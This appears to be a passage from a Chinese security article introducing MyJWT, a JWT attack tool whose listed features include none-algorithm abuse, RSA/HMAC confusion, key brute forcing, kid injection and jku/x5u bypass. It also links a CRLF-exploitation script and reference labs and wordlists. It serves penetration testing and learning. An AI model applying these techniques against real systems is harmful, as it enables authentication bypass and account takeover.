![](https://images.seebug.org/content/images/2023/10/23/1698030441000-badb949f-1bb2-4b6c-8ce8-a42493a136ac.png-w331s)

##### MyJWT

###### 项目地址

[https://github.com/tyki6/MyJWT/](https://github.com/tyki6/MyJWT/ "https://github.com/tyki6/MyJWT/ ")

![](https://images.seebug.org/content/images/2023/10/23/1698030442000-a0ca27c6-7b69-4977-af65-77746e6c5e67.png-w331s)

###### 功能说明

*   copy new jwt to clipboard
*   user Interface (thanks questionary)
*   color output
*   modify jwt (header/Payload)
*   None Vulnerability
*   RSA/HMAC confusion
*   Sign a jwt with key
*   Brute Force to guess key
*   crack jwt with regex to guess key
*   kid injection
*   Jku Bypass
*   X5u Bypass

##### 辅助脚本

###### 脚本地址

[https://gist.github.com/imparabl3/efcf4a991244b9f8f99ac39a7c8cfe6f](https://gist.github.com/imparabl3/efcf4a991244b9f8f99ac39a7c8cfe6f "https://gist.github.com/imparabl3/efcf4a991244b9f8f99ac39a7c8cfe6f ")

![](https://images.seebug.org/content/images/2023/10/23/1698030442000-2e4e5aa1-fe00-4033-b4d5-901c3b082d5e.png-w331s)

###### 脚本功能

用于利用CRLF漏洞的脚本

#### 参考链接

1.  [https://1024tools.com/hmac](https://1024tools.com/hmac "https://1024tools.com/hmac ")
    
2.  [https://github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool "https://github.com/ticarpi/jwt_tool")
    
3.  [https://www.anquanke.com/post/id/236830](https://www.anquanke.com/post/id/236830 "https://www.anquanke.com/post/id/236830")
    
4.  [https://www.freebuf.com/articles/web/337347.html](https://www.freebuf.com/articles/web/337347.html " https://www.freebuf.com/articles/web/337347.html")
    
5.  [https://digi.ninja/projects/authlab.php#landleakyjwt](https://digi.ninja/projects/authlab.php#landleakyjwt "https://digi.ninja/projects/authlab.php#landleakyjwt")
    
6.  [https://attackdefense.com/challengedetails?cid=1424](https://attackdefense.com/challengedetails?cid=1424 "https://attackdefense.com/challengedetails?cid=1424")
    
7.  [https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list "https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list")
    
8.  [https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature")
    
